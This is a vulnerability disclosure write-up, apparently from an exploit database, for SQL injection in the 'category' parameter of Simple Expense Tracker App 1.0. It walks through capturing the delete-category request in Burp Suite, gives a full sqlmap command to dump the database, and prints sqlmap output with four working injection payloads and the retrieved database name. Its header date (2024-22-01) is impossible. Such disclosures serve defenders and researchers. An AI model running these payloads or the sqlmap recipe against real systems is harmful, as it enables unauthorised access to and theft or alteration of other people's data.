# Simple Expense Tracker - SQL Injection-2
+ **Exploit Title:** Simple Expense Tracker - SQL Injection-2
+ **Date:** 2024-22-01
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/16794/simple-expense-tracker-app-using-php-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=16794&title=Expense+Tracker+App+Using+PHP+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
 Simple Expense Tracker App 1.0 allows SQL Injection via the 'category' parameter in "http://localhost/simple-expense-tracker-app/endpoint/delete_category.php?category=1". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/simple-expense-tracker-app/"
+ Select any category and press the delete-category button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /simple-expense-tracker-app/endpoint/delete_category.php?category=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36

```

+ Use sqlmap to exploit. In sqlmap, use 'category' parameter to dump the database.
```
sqlmap -r r.txt -p category --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: category=1' RLIKE (SELECT (CASE WHEN (4053=4053) THEN 1 ELSE 0x28 END))-- kOMM

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: category=1' AND EXTRACTVALUE(6799,CONCAT(0x5c,0x716b766b71,(SELECT (ELT(6799=6799,1))),0x7171707171))-- CpbI

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: category=1';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category=1' AND (SELECT 8971 FROM (SELECT(SLEEP(5)))GnJl)-- vuan
---
[18:43:46] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[18:43:46] [INFO] fetching current database
[18:43:46] [INFO] retrieved: 'expense_tracker_db'
current database: 'expense_tracker_db'
```
+ current database: `expense_tracker_db`

![Ekran görüntüsü 2024-01-30 025011](https://github.com/BurakSevben/CVEs/assets/117217689/f725b2d2-1ce7-49fa-aed9-949d26cd605a)

